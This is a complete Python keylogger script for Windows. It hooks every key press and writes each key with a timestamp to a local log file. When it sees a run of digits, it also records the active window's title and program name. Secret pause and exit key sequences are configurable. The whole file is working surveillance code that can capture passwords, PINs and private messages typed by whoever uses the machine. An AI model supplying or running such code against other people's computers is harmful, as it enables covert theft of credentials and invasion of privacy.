#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Date    : 2024/07/16
# @Author  : Kissablecho
# @FileName: Keyboard monitoring.py
# @Software: Visual Studio Code
# @Blog    ：https://blog.csdn.net/y223421
# @Blog    : https://buasis.eu.org/
# @Github  : https://github.com/God-2077

from datetime import datetime
import keyboard
from configparser import ConfigParser, NoSectionError, NoOptionError
import signal
import sys
import os
import time
import win32gui as w
import win32gui
import win32process
import psutil

# 初始化设置
current_script_path = os.path.abspath(__file__)
current_working_directory = os.getcwd()
timestamp = int(time.time())
wait_sequence, wait_time, exit_sequence, keynumber = '654321', 300, 'qqqwe', 6
starttime = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]

print(f"-----------------------------------------------------\nstart in {starttime}\n脚本的路径: {current_script_path}\n工作目录的路径: {current_working_directory}")

# 读取配置文件
conf = ConfigParser()
config_path = os.environ.get('keymonitor')


try:
    if not os.path.exists(config_path):
        raise FileNotFoundError(f"配置文件 {config_path} 不存在")

    print(f"配置文件路径: {config_path}")
    conf.read(config_path, encoding='utf-8')
    if 'config' not in conf:
        raise NoSectionError('config')

    keypath = conf.get('config', 'file', fallback='Keyboard.txt')
    wait_sequence = conf.get('config', 'wait', fallback='654321')
    wait_time = conf.getint('config', 'waittime', fallback=300)
    exit_sequence = conf.get('config', 'exit', fallback='qqqwe')
    keynumber = int(conf.get('config', 'keynumber', fallback=9))

except (FileNotFoundError, NoSectionError, NoOptionError) as e:
    print(f"错误: {e}")
    keypath = os.path.join(os.path.dirname(current_script_path), 'Keyboard.txt')

# 创建路径
os.makedirs(os.path.dirname(keypath), exist_ok=True)
print(f"键盘记录文件路径: {keypath}")

# 初始化键盘记录文件
with open(keypath, 'a', encoding='utf-8') as f:
    f.write(f"-----------------------------------------------------\nstart in {starttime}\n脚本的路径: {current_script_path}\n工作目录的路径: {current_working_directory}\n键盘记录文件路径: {keypath}\n")

input_buffer, input_buffertwo, number_buffer = [], [], []

# 键盘按键事件处理函数
def on_key(event):
    global timestamp
    input_buffertwo.append(event.name)
    if len(input_buffertwo) > len(exit_sequence):
        input_buffertwo.pop(0)
    if ''.join(input_buffertwo) == exit_sequence:
        log_exit_sequence()
    
    input_buffer.append(event.name)
    if len(input_buffer) > len(wait_sequence):
        input_buffer.pop(0)
    if ''.join(input_buffer) == wait_sequence:
        log_wait_sequence()

    if int(time.time()) > timestamp:
        log_key(event.name)
        detect_continuous_numbers(event.name)

# 记录退出序列的函数
def log_exit_sequence():
    localtime = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    print(f"{localtime}: 检测到输入序列 {exit_sequence}，exiting...")
    with open(keypath, 'a', encoding='utf-8') as f:
        f.write(f"{localtime}: 检测到输入序列 {exit_sequence}，exiting...\n")
    sys.exit(0)

# 记录等待序列的函数
def log_wait_sequence():
    global timestamp
    timestamp = int(time.time()) + wait_time
    localtime = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    print(f"{localtime}: 检测到输入序列 {wait_sequence}，暂停 {wait_time} 秒")
    with open(keypath, 'a', encoding='utf-8') as f:
        f.write(f"{localtime}: 检测到输入序列 {wait_sequence}，暂停 {wait_time} 秒\n")
    for i in range(wait_time, 0, -1):
        print(f"\r等待 {i} 秒！", end="", flush=True)
        time.sleep(1)
    print()

# 记录按键的函数
def log_key(key_name):
    localtime = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    print(f"{localtime} : {key_name}")
    with open(keypath, 'a', encoding='utf-8') as f:
        f.write(f"{localtime} : {key_name}\n")

# 检测连续数字的函数
def detect_continuous_numbers(key_name):
    global keynumber
    if key_name.isdigit():
        number_buffer.append(key_name)
        if len(number_buffer) > keynumber:
            number_buffer.pop(0)
        if len(number_buffer) == keynumber:
            log_continuous_numbers()
            jiluhudcwtitle()
    else:
        number_buffer.clear()

# 记录连续数字的函数
def log_continuous_numbers():
    localtime = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    print(f"{localtime} : number")
    with open(keypath, 'a', encoding='utf-8') as f:
        f.write(f"{localtime} : number\n")
    number_buffer.clear()

# 信号处理函数，捕捉Ctrl+C
def signal_handler(sig, frame):
    exittime = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    print(f"{exittime}: 检测到Ctrl+C, exiting...")
    with open(keypath, 'a', encoding='utf-8') as f:
        f.write(f"{exittime}: 检测到Ctrl+C, exiting...\n")
    sys.exit(0)

# 记录当前活动窗口的标题和程序名
def jiluhudcwtitle():
    title = w.GetWindowText (w.GetForegroundWindow())
    process_name = active_window_process_name()
    if title == "":
        title = "无"
    localtime = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    print(f"{localtime} : 活动窗口程序名'{process_name}'")
    print(f"{localtime} : 活动窗口标题'{title}'")
    with open(keypath, 'a', encoding='utf-8') as f:
        f.write(f"{localtime} : 活动窗口程序名'{process_name}'\n")
    with open(keypath, 'a', encoding='utf-8') as f:
        f.write(f"{localtime} : 活动窗口 '{title}'\n")

# 当前活动窗口的程序名
def active_window_process_name():
    try:
        pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
        return(psutil.Process(pid[-1]).name())
    except:
        pass

# 注册信号处理函数
signal.signal(signal.SIGINT, signal_handler)
# 监听键盘按键事件
keyboard.on_press(on_key)
# 等待键盘事件
keyboard.wait()